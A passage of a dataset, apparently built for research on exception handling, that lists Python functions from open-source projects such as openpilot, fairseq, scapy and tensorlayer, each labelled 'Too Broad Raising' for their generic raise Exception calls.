        newNamesStr = subM.group(3)
      else: # sub2M
        findNamesStr = sub2M.group(1)
        findNamesBStr = sub2M.group(2)
        apos0 = sub2M.group(3)
        newNamesStr = sub2M.group(4)

      if newNamesStr[0] == '[':
        newNamesHasBrackets = True
        newNamesStr = newNamesStr.strip('[ ]')
      newNames = spacesRe.split(newNamesStr)

      if findNamesStr[0] == '[':
        findNamesHasBrackets = True
        findNamesStr = findNamesStr.strip('[ ]')
      findNames = spacesRe.split(findNamesStr)

      if findNamesBStr != '':
        if findNamesBStr[0] == '[':
          findNamesBHasBrackets = True
          findNamesBStr = findNamesBStr.strip('[ ]')
        findNamesB = spacesRe.split(findNamesBStr)


      names22 = []
      for names in [findNames, findNamesB, newNames]:
        names2 = []
        for name in names:
          if name[0] == '@':
            clsName = name[1:].rstrip(""'"")
            if clsName not in classDefs:
              raise Exception('sub: missing target class ' + clsName + ' at\n' + line)
            names2.append(name)
          else:
            apos = name[-1] == ""'""
            if apos:
              name = name[:-1]
            if name not in allNames:
              canonName = canonicalGlyphName(name, uc2names)
              if canonName != name:
                print('renaming ' + name + ' -> ' + canonName)
                name = canonName
              else:
                raise Exception('TODO: unknown name', name)
                # if we remove names, we also need to remove subs (that become empty), and so on.
            if apos:
              name += ""'""
            names2.append(name)
        names22.append(names2)

      findNames2, findNamesB2, newNames2 = names22

      findNamesStr = ' '.join(findNames2)
      if findNamesHasBrackets: findNamesStr = '[' + findNamesStr + ']'

      if findNamesBStr != '':
        findNamesBStr = ' '.join(findNamesB2)
        if findNamesBHasBrackets: findNamesBStr = '[' + findNamesBStr + ']'

      newNamesStr = ' '.join(newNames2)
      if newNamesHasBrackets: newNamesStr = '[' + newNamesStr + ']'

      if subM is not None:
        line = '  sub %s%s by %s;' % (findNamesStr, apos0, newNamesStr)
      else:
      # if subM is None:
        # sub bbar [uni1ABB uni1ABD uni1ABE]' by uni1ABE.w2;
        line = '  sub %s [%s]%s by %s;' % (findNamesStr, findNamesBStr, apos0, newNamesStr)

    featuresLines2.append(line)


  print('Write', featuresFilename)
  if not dryRun:
    with open(featuresFilename + '2', 'w') as f:
      for line in featuresLines2:
        f.write(line + '\n')

    # FeaParser(featuresFilename + '2', allNames).parse()

    # font = TTFont('build/const/Inter-Regular.otf')
    # FeaBuilder(font, featuresFilename + '2').build()",Too Broad Raising,1
60,wagtail,/home/r4ph/desenv/phd/exception-miner/projects/py/wagtail/wagtail/tests/test_utils.py,setUp,"def setUp(self):
        class Thing:
            colour = ""green""
            limbs = {""arms"": 2, ""legs"": 3}

            def __init__(self):
                self.poke_was_called = False

            def speak(self):
                return ""raaargh""

            def feed(self, food):
                return ""gobble""

            def poke(self):
                self.poke_was_called = True
                raise Exception(""don't do that"")

            poke.alters_data = True

        self.thing = Thing()",Too Broad Raising,1
61,tensorlayer,/home/r4ph/desenv/phd/exception-miner/projects/py/tensorlayer/tensorlayer/db.py,save_dataset,"def save_dataset(self, dataset=None, dataset_name=None, **kwargs):
        """"""Saves one dataset into database, timestamp will be added automatically.

        Parameters
        ----------
        dataset : any type
            The dataset you want to store.
        dataset_name : str
            The name of dataset.
        kwargs : other events
            Other events, such as description, author and etc (optinal).

        Examples
        ----------
        Save dataset
        >>> db.save_dataset([X_train, y_train, X_test, y_test], 'mnist', description='this is a tutorial')

        Get dataset
        >>> dataset = db.find_top_dataset('mnist')

        Returns
        ---------
        boolean : Return True if save success, otherwise, return False.
        """"""
        self._fill_project_info(kwargs)
        if dataset_name is None:
            raise Exception(""dataset_name is None, please give a dataset name"")
        kwargs.update({'dataset_name': dataset_name})

        s = time.time()
        try:
            dataset_id = self.dataset_fs.put(self._serialization(dataset))
            kwargs.update({'dataset_id': dataset_id, 'time': datetime.utcnow()})
            self.db.Dataset.insert_one(kwargs)
            # print(""[Database] Save params: {} SUCCESS, took: {}s"".format(file_name, round(time.time()-s, 2)))
            print(""[Database] Save dataset: SUCCESS, took: {}s"".format(round(time.time() - s, 2)))
            return True
        except Exception as e:
            exc_type, exc_obj, exc_tb = sys.exc_info()
            fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
            logging.info(""{}  {}  {}  {}  {}"".format(exc_type, exc_obj, fname, exc_tb.tb_lineno, e))
            print(""[Database] Save dataset: FAIL"")
            return False",Too Broad Raising,1
62,inter,/home/r4ph/desenv/exception-miner/projects/py/inter/misc/tools/svgsync.py,syncGlyph,"def syncGlyph(glyphname):
  glyphFile, glyphStat = findGlifFile(glyphname)

  svgFile = os.path.join(svgdir, glyphname + '.svg')
  svgStat = stat(svgFile)

  if glyphStat is None and svgStat is None:
    raise Exception(""glyph %r doesn't exist in UFO or SVG directory"" % glyphname)

  c = cmp(
    0 if glyphStat is None else glyphStat.st_mtime,
    0 if svgStat is None else svgStat.st_mtime
  )
  if c < 0:
    syncGlyphSVGToUFO(glyphname, svgFile)
    return (glyphFile, svgStat.st_mtime) # glif file in UFO change + it's new mtime
  elif c > 0:
    syncGlyphUFOToSVG(glyphname, svgFile, glyphStat.st_mtime)
  # else:
  #   print glyphname + ': up to date'

  return (None, 0)",Too Broad Raising,1
63,openpilot,/home/r4ph/desenv/exception-miner/projects/py/openpilot/third_party/acados/acados_template/acados_ocp.py,x0,"def x0(self, x0):
        if isinstance(x0, np.ndarray):
            self.__lbx_0 = x0
            self.__ubx_0 = x0
            self.__idxbx_0 = np.arange(x0.size)
            self.__idxbxe_0 = np.arange(x0.size)
        else:
            raise Exception('Invalid x0 value. Exiting.')",Too Broad Raising,1
64,openpilot,/home/r4ph/desenv/exception-miner/projects/py/openpilot/tinygrad_repo/extra/onnx.py,run_onnx,"def run_onnx(inputs={}, debug=False):
    if getenv(""DEBUGONNX""): debug = True
    input_tensors = {}
    intermediate_tensors = {}
    output_tensor_names = [x.name for x in onnx_model.graph.output]

    # get inputs
    for inp in onnx_model.graph.input:
      if inp.name in tensors: continue
      shape = shape_to_tuple(inp.type.tensor_type.shape)
      if len(shape) >= 1 and shape[0] == 0: shape = tuple([1]+list(shape[1:]))   # 1 batch size
      if inp.name in inputs:
        input_shape = inputs[inp.name].shape
        if input_shape == (0,): raise NotImplementedError(""empty tensors aren't supported in tinygrad"")
        assert input_shape == shape, f""wrong shape for input {inp.name}, {input_shape} isn't {shape}""
        if isinstance(inputs[inp.name], Tensor):
          input_tensors[inp.name] = inputs[inp.name]
        else:
          input_tensors[inp.name] = Tensor(inputs[inp.name], requires_grad=False)
        for _,v in input_tensors.items(): v.realize()
      else:
        raise Exception(f""no data for {inp.name} with shape {shape}"")

    for num,n in enumerate(onnx_model.graph.node):
      inp = [tensors[x] if x in tensors else (intermediate_tensors[x] if x in intermediate_tensors else (input_tensors[x] if x != str() else None)) for x in n.input]
      opt = attribute_dict[num]
      if debug: print(f""{num}: op {n.op_type} shape {[x.shape if isinstance(x, Tensor) else x for x in inp]} opt {opt}"")

      # free ones
      if n.op_type == ""Relu"": ret = inp[0].relu()
      elif n.op_type == ""Sigmoid"": ret = inp[0].sigmoid()
      elif n.op_type == ""Tanh"": ret = inp[0].tanh()
      elif n.op_type == ""MatMul"": ret = inp[0].matmul(inp[1])
      # one liners
      elif n.op_type == ""Elu"": ret = inp[0].elu(alpha=opt.get('alpha', 1.0))
      elif n.op_type == ""Concat"": ret = inp[0].cat(*inp[1:], dim=opt['axis'])
      elif n.op_type == ""Transpose"": ret = inp[0].permute(order=opt.get('perm', list(range(len(inp[0].shape))[::-1])))
      elif n.op_type == ""Squeeze"": ret = inp[0].reshape([s for i,s in enumerate(inp[0].shape) if i not in opt['axes']])
      elif n.op_type == ""Div"":
        # in openpilot, due to SHUFFLE_PAD_OPS issues, we are spending an extra kernel
        ret = inp[0].div(inp[1])
      elif n.op_type == ""Constant"": ret = opt['value'] if 'value' in opt else opt['value_float']
      elif n.op_type == ""Reshape"": ret = inp[0].reshape([int(x) if x != 0 else inp[0].shape[i] for i,x in enumerate(safe_numpy(inp[1]))])
      elif n.op_type == ""Resize"":
        # TODO: this is handcoded for YOLOv8
        scales = safe_numpy(inp[2])
        assert all([int(x) == x and x >= 1 for x in scales])
        ret = inp[0].reshape([val for pair in zip(inp[0].shape, [1] * len(scales)) for val in pair])
        ret = ret.expand([val for pair in zip(inp[0].shape, [int(x) for x in scales]) for val in pair])
        ret = ret.reshape([x*y for x,y in zip(inp[0].shape, [int(x) for x in scales])])
      elif n.op_type == ""Gather"":
        # TODO: is this correct? seems to work for simple gather ops
        axis = opt['axis']
        shape = list(inp[0].shape)
        indices = [shape[axis]+int(x) if x<0 else int(x) for x in safe_numpy(inp[1])]
        args = [[(0,x) if j != axis else (i,i+1) for j, x in enumerate(shape)] for i in indices]
        ret = inp[0].slice(arg=args[0]).cat(*[inp[0].slice(arg=arg) for arg in args[1:]], dim=axis)
        ret = ret.reshape([s for i,s in enumerate(shape) if i != axis]) if len(indices) == 1 else ret # squeeze if needed
      elif n.op_type in [""Add"", ""Sub"", ""Mul"", ""Pow""]:
        # TODO: add this to tinygrad? i don't think it's in torch
        if len(inp[0].shape) != len(inp[1].shape) and prod(inp[0].shape) == prod(inp[1].shape):
          inp[1] = inp[1].reshape(inp[0].shape)
        # TODO: is this right?
        if 'broadcast' in opt: inp[1] = inp[1].reshape([-1 if i == opt['broadcast'] else 1 for i in range(len(inp[0].shape))])
        if n.op_type == ""Add"": ret = inp[0] + inp[1]
        if n.op_type == ""Sub"": ret = inp[0] - inp[1]
        if n.op_type == ""Mul"": ret = inp[0] * inp[1]
        if n.op_type == ""Pow"": ret = inp[0] ** inp[1]
      elif n.op_type == ""Split"":
        if 'split' not in opt: opt['split'] = [int(x) for x in safe_numpy(inp[1])]  # split can be a tensor
        i = 0
        arg = [(0,x) for x in inp[0].shape]
        for o,s in zip(n.output, opt['split']):
          arg[opt['axis']] = (i,i+s)
          intermediate_tensors[o] = inp[0].slice(arg=arg)
          i = i+s
        continue
      elif n.op_type == ""Slice"":
        assert onnx_version == 10
        arg = [(0,x) for x in inp[0].shape]
        starts, ends, axes = inp[1:4]
        assert axes.shape == (1,)
        axis, starts, ends  = int(safe_numpy(axes)[0]), int(safe_numpy(starts)[0]), int(safe_numpy(ends)[0])
        ends = min(ends, inp[0].shape[axis])
        starts = starts + inp[0].shape[axis] if starts < 0 else starts
        arg[axis] = (starts, ends)
        ret = inp[0].slice(arg=arg)
      elif hasattr(onnx_ops, n.op_type):
        fxn = getattr(onnx_ops, n.op_type)
        if isinstance(fxn, dict):
          for k in sorted(fxn.keys()):
            if k < onnx_version:
              real_fxn = fxn[k]
        else:
          real_fxn = fxn
        ret = real_fxn(*inp, **opt)
      else:
        print(""UNSUPPORTED"", n.op_type, n.input, n.output)
        raise Exception(f""op_type {n.op_type} not supported"")
      if not isinstance(ret, tuple): ret = (ret, )
      assert len(n.output) <= len(ret), f""expected output size must be less than {len(ret)}, it's {n.output}""
      if debug: print([x.shape if isinstance(x, Tensor) else None for x in ret])
      for i in range(len(n.output)): intermediate_tensors[n.output[i]] = ret[i]
      #print(ret[0].numpy().mean())
      if num == ONNXLIMIT:
        output_tensor_names = n.output
        break

    return {outp:intermediate_tensors[outp] for outp in output_tensor_names}",Too Broad Raising,1
65,paddleocr,/home/r4ph/desenv/exception-miner/projects/py/paddleocr/ppocr/data/simple_dataset.py,__getitem__,"def __getitem__(self, properties):
        # properites is a tuple, contains (width, height, index)
        img_height = properties[1]
        idx = properties[2]
        if self.ds_width and properties[3] is not None:
            wh_ratio = properties[3]
            img_width = img_height * (1 if int(round(wh_ratio)) == 0 else
                                      int(round(wh_ratio)))
            file_idx = self.wh_ratio_sort[idx]
        else:
            file_idx = self.data_idx_order_list[idx]
            img_width = properties[0]
            wh_ratio = None

        data_line = self.data_lines[file_idx]
        try:
            data_line = data_line.decode('utf-8')
            substr = data_line.strip(""\n"").split(self.delimiter)
            file_name = substr[0]
            file_name = self._try_parse_filename_list(file_name)
            label = substr[1]
            img_path = os.path.join(self.data_dir, file_name)
            data = {'img_path': img_path, 'label': label}
            if not os.path.exists(img_path):
                raise Exception(""{} does not exist!"".format(img_path))
            with open(data['img_path'], 'rb') as f:
                img = f.read()
                data['image'] = img
            data['ext_data'] = self.get_ext_data()
            outs = transform(data, self.ops[:-1])
            if outs is not None:
                outs = self.resize_norm_img(outs, img_width, img_height)
                outs = transform(outs, self.ops[-1:])
        except:
            self.logger.error(
                ""When parsing line {}, error happened with msg: {}"".format(
                    data_line, traceback.format_exc()))
            outs = None
        if outs is None:
            # during evaluation, we should fix the idx to get same results for many times of evaluation.
            rnd_idx = (idx + 1) % self.__len__()
            return self.__getitem__([img_width, img_height, rnd_idx, wh_ratio])
        return outs",Too Broad Raising,1
66,localstack,/home/r4ph/desenv/exception-miner/projects/py/localstack/localstack/utils/aws/aws_stack.py,get_environment,"def get_environment(env=None, region_name=None):
    """"""
    Return an Environment object based on the input arguments.

    Parameter `env` can be either of:
        * None (or empty), in which case the rules below are applied to (env = os.environ['ENV'] or ENV_DEV)
        * an Environment object (then this object is returned)
        * a string '<region>:<name>', which corresponds to Environment(region='<region>', prefix='<prefix>')
        * the predefined string 'dev' (ENV_DEV), which implies Environment(region='local', prefix='dev')
        * a string '<name>', which implies Environment(region=DEFAULT_REGION, prefix='<name>')

    Additionally, parameter `region_name` can be used to override DEFAULT_REGION.
    """"""
    if not env:
        if ""ENV"" in os.environ:
            env = os.environ[""ENV""]
        else:
            env = ENV_DEV
    elif not is_string(env) and not isinstance(env, Environment):
        raise Exception(""Invalid environment: %s"" % env)

    if is_string(env):
        env = Environment.from_string(env)
    if region_name:
        env.region = region_name
    if not env.region:
        raise Exception('Invalid region in environment: ""%s""' % env)
    return env",Too Broad Raising,1
67,tensorlayer,/home/r4ph/desenv/phd/exception-miner/projects/py/tensorlayer/tensorlayer/layers/convolution/super_resolution.py,_PS,"def _PS(self, X, r, n_out_channels):

        _err_log = ""SubpixelConv2d: The number of input channels == (scale x scale) x The number of output channels""

        if n_out_channels >= 1:
            if int(X.get_shape()[-1]) != (r**2) * n_out_channels:
                raise Exception(_err_log)

            X = tf.compat.v1.depth_to_space(input=X, block_size=r)
        else:
            raise RuntimeError(_err_log)

        return X",Too Broad Raising,1
68,openpilot,/home/r4ph/desenv/exception-miner/projects/py/openpilot/third_party/acados/acados_template/acados_ocp.py,collocation_type,"def collocation_type(self, collocation_type):
        collocation_types = ('GAUSS_RADAU_IIA', 'GAUSS_LEGENDRE')
        if collocation_type in collocation_types:
            self.__collocation_type = collocation_type
        else:
            raise Exception('Invalid collocation_type value. Possible values are:\n\n' \
                    + ',\n'.join(collocation_types) + '.\n\nYou have: ' + collocation_type + '.\n\nExiting.')",Too Broad Raising,1
69,xx-net,/home/r4ph/desenv/exception-miner/projects/py/xx-net/code/default/lib/noarch/simple_http_client.py,recv,"def recv(self, to_read=8192, timeout=30.0):
        if timeout < 0:
            raise Exception(""recv timeout"")

        start_time = time.time()
        end_time = start_time + timeout
        while time.time() < end_time:
            try:
                return self.sock.recv(to_read)
            except socket.error as e:
                if e.errno in [2, 11, 35, 10035]:
                    time_left = end_time - time.time()
                    if time_left < 0:
                        break

                    # select.select([self.sock], [], [self.sock], time_left)
                    self.select2.select(timeout=time_left)
                    continue
                else:
                    raise e

        raise Exception(""recv timeout"")",Too Broad Raising,1
70,unilm,/home/r4ph/desenv/phd/exception-miner/projects/py/unilm/kosmos-2/fairseq/fairseq/models/__init__.py,build_model,"def build_model(cfg: FairseqDataclass, task, from_checkpoint=False):

    model = None
    model_type = getattr(cfg, ""_name"", None) or getattr(cfg, ""arch"", None)

    if not model_type and len(cfg) == 1:
        # this is hit if config object is nested in directory that is named after model type

        model_type = next(iter(cfg))
        if model_type in MODEL_DATACLASS_REGISTRY:
            cfg = cfg[model_type]
        else:
            raise Exception(
                ""Could not infer model type from directory. Please add _name field to indicate model type. ""
                ""Available models: ""
                + str(MODEL_DATACLASS_REGISTRY.keys())
                + "" Requested model type: ""
                + model_type
            )

    if model_type in ARCH_MODEL_REGISTRY:
        # case 1: legacy models
        model = ARCH_MODEL_REGISTRY[model_type]
    elif model_type in MODEL_DATACLASS_REGISTRY:
        # case 2: config-driven models
        model = MODEL_REGISTRY[model_type]

    if model_type in MODEL_DATACLASS_REGISTRY:
        # set defaults from dataclass. note that arch name and model name can be the same
        dc = MODEL_DATACLASS_REGISTRY[model_type]

        if isinstance(cfg, argparse.Namespace):
            cfg = dc.from_namespace(cfg)
        else:
            cfg = merge_with_parent(dc(), cfg, from_checkpoint)
    else:
        if model_type in ARCH_CONFIG_REGISTRY:
            with open_dict(cfg) if OmegaConf.is_config(cfg) else ExitStack():
                # this calls the different ""arch"" functions (like base_architecture()) that you indicate
                # if you specify --arch on the command line. this is only applicable to the old argparse based models
                # hydra models should expose different architectures via different config files
                # it will modify the cfg object and default parameters according to the arch
                ARCH_CONFIG_REGISTRY[model_type](cfg)

    assert model is not None, (
        f""Could not infer model type from {cfg}. ""
        ""Available models: {}"".format(MODEL_DATACLASS_REGISTRY.keys())
        + f"" Requested model type: {model_type}""
    )

    return model.build_model(cfg, task)",Too Broad Raising,1
71,deepfacelive,/home/r4ph/desenv/phd/exception-miner/projects/py/deepfacelive/xlib/avecl/_internal/backend/Device.py,_cl_mem_pool_alloc,"def _cl_mem_pool_alloc(self, size):
        """"""
        allocate or get cl_mem from pool
        """"""
        self._keep_target_memory_usage()

        pool = self._pooled_buffers

        # First try to get pooled buffer
        ar = pool.get(size, None)
        if ar is not None and len(ar) != 0:
            mem = ar.pop()
            self._total_memory_pooled -= size
            self._total_buffers_pooled -= 1
        else:
            # No pooled buffer, try to allocate new
            while True:
                mem = self._cl_mem_alloc(size)
                if mem is None:
                    # MemoryError.
                    if not self._release_random_pooled_buffers():
                        raise Exception(f'Unable to allocate {size // 1024**2}Mb on {self.get_description()}')
                    continue
                break

        return mem",Too Broad Raising,1
72,openpilot,/home/r4ph/desenv/exception-miner/projects/py/openpilot/third_party/acados/acados_template/acados_sim.py,nx,"def nx(self, nx):
        if isinstance(nx, int) and nx > 0:
            self.__nx = nx
        else:
            raise Exception('Invalid nx value, expected positive integer. Exiting.')",Too Broad Raising,1
73,fairseq,/home/r4ph/desenv/exception-miner/projects/py/fairseq/examples/data2vec/models/audio_classification.py,compute_gain_torch,"def compute_gain_torch(self, sound, fs=16_000, min_db=-80.0, mode=""A_weighting""):
        if fs == 16000:
            n_fft = 2048
        elif fs == 44100:
            n_fft = 4096
        else:
            raise Exception(""Invalid fs {}"".format(fs))

        if mode == ""A_weighting"":
            if not hasattr(self, f""a_weight""):
                self.a_weight = {}

            if fs not in self.a_weight:

                def a_weight(fs, n_fft, min_db=-80.0):
                    freq = np.linspace(0, fs // 2, n_fft // 2 + 1)
                    freq_sq = freq ** 2
                    freq_sq[0] = 1.0
                    weight = 2.0 + 20.0 * (
                        2 * np.log10(12194)
                        + 2 * np.log10(freq_sq)
                        - np.log10(freq_sq + 12194 ** 2)
                        - np.log10(freq_sq + 20.6 ** 2)
                        - 0.5 * np.log10(freq_sq + 107.7 ** 2)
                        - 0.5 * np.log10(freq_sq + 737.9 ** 2)
                    )
                    weight = np.maximum(weight, min_db)

                    return weight

                self.a_weight[fs] = torch.from_numpy(
                    np.power(10, a_weight(fs, n_fft, min_db) / 10)
                ).to(device=sound.device)

        sound = sound.unfold(-1, n_fft, n_fft // 2)

        if mode == ""RMSE"":
            sound = sound ** 2
            g = sound.mean(-1)
        elif mode == ""A_weighting"":
            w = torch.hann_window(n_fft, device=sound.device) * sound
            spec = torch.fft.rfft(w)
            power_spec = spec.abs() ** 2
            a_weighted_spec = power_spec * self.a_weight[fs]
            g = a_weighted_spec.sum(-1)
        else:
            raise Exception(""Invalid mode {}"".format(mode))

        gain = torch.maximum(g, torch.tensor(10 ** (min_db / 10), device=g.device))
        gain_db = 10 * torch.log10(gain)

        return gain_db",Too Broad Raising,1
74,imgaug,/home/r4ph/desenv/phd/exception-miner/projects/py/imgaug/imgaug/augmenters/size.py,__init__,"def __init__(self, children,
                 interpolation=""cubic"",
                 interpolation_heatmaps=SAME_AS_IMAGES,
                 interpolation_segmaps=""nearest"",
                 seed=None, name=None,
                 random_state=""deprecated"", deterministic=""deprecated""):
        super(KeepSizeByResize, self).__init__(
            seed=seed, name=name,
            random_state=random_state, deterministic=deterministic)
        self.children = children

        @iap._prefetchable_str
        def _validate_param(val, allow_same_as_images):
            valid_ips_and_resize = ia.IMRESIZE_VALID_INTERPOLATIONS \
                                  + [KeepSizeByResize.NO_RESIZE]
            if allow_same_as_images and val == self.SAME_AS_IMAGES:
                return self.SAME_AS_IMAGES
            if val in valid_ips_and_resize:
                return iap.Deterministic(val)
            if isinstance(val, list):
                assert len(val) > 0, (
                    ""Expected a list of at least one interpolation method. ""
                    ""Got an empty list."")
                valid_ips_here = valid_ips_and_resize
                if allow_same_as_images:
                    valid_ips_here = valid_ips_here \
                                     + [KeepSizeByResize.SAME_AS_IMAGES]
                only_valid_ips = all([ip in valid_ips_here for ip in val])
                assert only_valid_ips, (
                    ""Expected each interpolations to be one of '%s', got ""
                    ""'%s'."" % (str(valid_ips_here), str(val)))
                return iap.Choice(val)
            if isinstance(val, iap.StochasticParameter):
                return val
            raise Exception(
                ""Expected interpolation to be one of '%s' or a list of ""
                ""these values or a StochasticParameter. Got type %s."" % (
                    str(ia.IMRESIZE_VALID_INTERPOLATIONS), type(val)))

        self.children = meta.handle_children_list(children, self.name, ""then"")
        self.interpolation = _validate_param(interpolation, False)
        self.interpolation_heatmaps = _validate_param(interpolation_heatmaps,
                                                      True)
        self.interpolation_segmaps = _validate_param(interpolation_segmaps,
                                                     True)",Too Broad Raising,1
75,openpilot,/home/r4ph/desenv/exception-miner/projects/py/openpilot/third_party/acados/acados_template/acados_ocp.py,lbu,"def lbu(self, lbu):
        if isinstance(lbu, np.ndarray):
            self.__lbu = lbu
        else:
            raise Exception('Invalid lbu value. Exiting.')",Too Broad Raising,1
76,openpilot,/home/r4ph/desenv/exception-miner/projects/py/openpilot/third_party/acados/acados_template/acados_ocp.py,uh_e,"def uh_e(self, uh_e):
        if isinstance(uh_e, np.ndarray):
            self.__uh_e = uh_e
        else:
            raise Exception('Invalid uh_e value. Exiting.')",Too Broad Raising,1
77,archivebox,/home/r4ph/desenv/exception-miner/projects/py/archivebox/deb_dist/archivebox-0.4.24/build/lib/archivebox/config.py,load_config_val,"def load_config_val(key: str,
                    default: ConfigDefaultValue=None,
                    type: Optional[Type]=None,
                    aliases: Optional[Tuple[str, ...]]=None,
                    config: Optional[ConfigDict]=None,
                    env_vars: Optional[os._Environ]=None,
                    config_file_vars: Optional[Dict[str, str]]=None) -> ConfigValue:
    """"""parse bool, int, and str key=value pairs from env""""""


    config_keys_to_check = (key, *(aliases or ()))
    for key in config_keys_to_check:
        if env_vars:
            val = env_vars.get(key)
            if val:
                break
        if config_file_vars:
            val = config_file_vars.get(key)
            if val:
                break

    if type is None or val is None:
        if callable(default):
            assert isinstance(config, dict)
            return default(config)

        return default

    elif type is bool:
        if val.lower() in ('true', 'yes', '1'):
            return True
        elif val.lower() in ('false', 'no', '0'):
            return False
        else:
            raise ValueError(f'Invalid configuration option {key}={val} (expected a boolean: True/False)') 

    elif type is str:
        if val.lower() in ('true', 'false', 'yes', 'no', '1', '0'):
            raise ValueError(f'Invalid configuration option {key}={val} (expected a string)')
        return val.strip()

    elif type is int:
        if not val.isdigit():
            raise ValueError(f'Invalid configuration option {key}={val} (expected an integer)')
        return int(val)

    elif type is list:
        return json.loads(val)

    raise Exception('Config values can only be str, bool, int or json')",Too Broad Raising,1
78,scapy,/home/r4ph/desenv/phd/exception-miner/projects/py/scapy/scapy/contrib/http2.py,parse_txt_hdrs,"def parse_txt_hdrs(self,
                       s,  # type: Union[bytes, str]
                       stream_id=1,  # type: int
                       body=None,  # type: Optional[str]
                       max_frm_sz=4096,  # type: int
                       max_hdr_lst_sz=0,  # type: int
                       is_sensitive=lambda n, v: False,  # type: Callable[[str, str], bool]  # noqa: E501
                       should_index=lambda x: False,  # type: Callable[[str], bool]  # noqa: E501
                       register=True,  # type: bool
                       ):
        # type: (...) -> H2Seq
        """"""
        parse_txt_hdrs parses headers expressed in text and converts them
        into a series of H2Frames with the ""correct"" flags. A body can be
        provided in which case, the data frames are added, bearing the End
        Stream flag, instead of the H2HeadersFrame/H2ContinuationFrame.
        The generated frames may respect max_frm_sz (SETTINGS_MAX_FRAME_SIZE)
        and max_hdr_lst_sz (SETTINGS_MAX_HEADER_LIST_SIZE) if provided.
        The headers are split into multiple headers fragment (and H2Frames)
        to respect these limits. Also, a callback can be provided to tell if
        a header should be never indexed (sensitive headers, such as cookies),
        and another callback say if the header should be registered into the
        index table at all.
        For an header to be registered, the is_sensitive callback must return
        False AND the should_index callback should return True. This is the
        default behavior.

        :param str s: the string to parse for headers
        :param int stream_id: the stream id to use in the generated H2Frames
        :param str/None body: the eventual body of the request, that is added
          to the generated frames
        :param int max_frm_sz: the maximum frame size. This is used to split
          the headers and data frames according to the maximum frame size
          negotiated for this connection.
        :param int max_hdr_lst_sz: the maximum size of a ""header fragment"" as
          defined in RFC7540
        :param callable is_sensitive: callback that returns True if the
          provided header is sensible and must be stored in a header packet
          requesting this header never to be indexed
        :param callable should_index: callback that returns True if the
          provided header should be stored in a header packet requesting
          indexation in the dynamic header table.
        :param bool register: whether to register new headers with incremental
          indexing as we parse them
        :raises: Exception
        """"""

        sio = BytesIO(s.encode() if isinstance(s, str) else s)

        base_frm_len = len(raw(H2Frame()))

        ret = H2Seq()
        cur_frm = H2HeadersFrame()  # type: Union[H2HeadersFrame, H2ContinuationFrame]  # noqa: E501
        cur_hdr_sz = 0

        # For each line in the headers str to parse
        for hdr_line in sio:
            hdr_name, hdr_value = self._parse_header_line(hdr_line)
            if hdr_name is None:
                continue

            new_hdr, new_hdr_len = self._convert_a_header_to_a_h2_header(
                hdr_name, hdr_value, is_sensitive, should_index
            )
            new_hdr_bin_len = len(raw(new_hdr))

            if register and isinstance(new_hdr, HPackLitHdrFldWithIncrIndexing):  # noqa: E501
                self.register(new_hdr)

            # The new header binary length (+ base frame size) must not exceed
            # the maximum frame size or it will just never fit. Also, the
            # header entry length (as specified in RFC7540 par6.5.2) must not
            # exceed the maximum length of a header fragment or it will just
            # never fit
            if (new_hdr_bin_len + base_frm_len > max_frm_sz or
                    (max_hdr_lst_sz != 0 and new_hdr_len > max_hdr_lst_sz)):
                raise Exception('Header too long: {}'.format(hdr_name))

            if (max_frm_sz < len(raw(cur_frm)) + base_frm_len + new_hdr_len or
                (
                    max_hdr_lst_sz != 0 and
                    max_hdr_lst_sz < cur_hdr_sz + new_hdr_len
            )
            ):
                flags = set()
                if isinstance(cur_frm, H2HeadersFrame) and not body:
                    flags.add('ES')
                ret.frames.append(H2Frame(stream_id=stream_id, flags=flags) / cur_frm)  # noqa: E501
                cur_frm = H2ContinuationFrame()
                cur_hdr_sz = 0

            hdr_list = cur_frm.hdrs
            hdr_list += new_hdr
            cur_hdr_sz += new_hdr_len

        flags = {'EH'}
        if isinstance(cur_frm, H2HeadersFrame) and not body:
            flags.add('ES')
        ret.frames.append(H2Frame(stream_id=stream_id, flags=flags) / cur_frm)

        if body:
            base_data_frm_len = len(raw(H2DataFrame()))
            sio = BytesIO(body)
            frgmt = sio.read(max_frm_sz - base_data_frm_len - base_frm_len)
            while frgmt:
                nxt_frgmt = sio.read(max_frm_sz - base_data_frm_len - base_frm_len)  # noqa: E501
                flags = set()
                if len(nxt_frgmt) == 0:
                    flags.add('ES')
                ret.frames.append(
                    H2Frame(stream_id=stream_id, flags=flags) / H2DataFrame(data=frgmt)  # noqa: E501
                )
                frgmt = nxt_frgmt
        return ret",Too Broad Raising,1
79,deoldify,/home/r4ph/desenv/exception-miner/projects/py/deoldify/fastai/data_block.py,databunch,"def databunch(self, **kwargs):
        ""To throw a clear error message when the data wasn't labeled.""
        raise Exception(""Your data isn't labeled, can't turn it into a `DataBunch` yet!"")",Too Broad Raising,1
80,deepfacelive,/home/r4ph/desenv/phd/exception-miner/projects/py/deepfacelive/xlib/avecl/_internal/AAxes.py,__iter__,"def __iter__(self):
        if self.is_none_axes():
            raise Exception(f'none-axes does not support iteration. Handle none-axes by calling .is_none_axes()')
        return self.axes.__iter__()",Too Broad Raising,1
81,spiderfoot,/home/r4ph/desenv/phd/exception-miner/projects/py/spiderfoot/test/unit/modules/test_sfp_names.py,test_handleEvent_event_data_email_address_not_containing_names_should_not_return_event,"def test_handleEvent_event_data_email_address_not_containing_names_should_not_return_event(self):
        sf = SpiderFoot(self.default_options)

        module = sfp_names()
        module.setup(sf, dict())

        target_value = 'spiderfoot.net'
        target_type = 'INTERNET_NAME'
        target = SpiderFootTarget(target_value, target_type)
        module.setTarget(target)

        def new_notifyListeners(self, event):
            raise Exception(f""Raised event {event.eventType}: {event.data}"")

        module.notifyListeners = new_notifyListeners.__get__(module, sfp_names)

        event_type = 'ROOT'
        event_data = 'example data'
        event_module = ''
        source_event = ''
        evt = SpiderFootEvent(event_type, event_data, event_module, source_event)

        event_type = 'EMAILADDR'
        event_data = 'lastname@spiderfoot.net'
        event_module = 'example module'
        source_event = evt
        evt = SpiderFootEvent(event_type, event_data, event_module, source_event)

        result = module.handleEvent(evt)

        self.assertIsNone(result)",Too Broad Raising,1
82,mlflow,/home/r4ph/desenv/phd/exception-miner/projects/py/mlflow/mlflow/pyfunc/scoring_server/client.py,invoke,"def invoke(self, data, params: Optional[Dict[str, Any]] = None):
        """"""
        :param data: Model input data.
        :param params: Additional parameters to pass to the model for inference.

                       .. Note:: Experimental: This parameter may change or be removed in a future
                                               release without warning.
        :return: :py:class:`PredictionsResponse <mlflow.deployments.PredictionsResponse>` result.
        """"""
        response = requests.post(
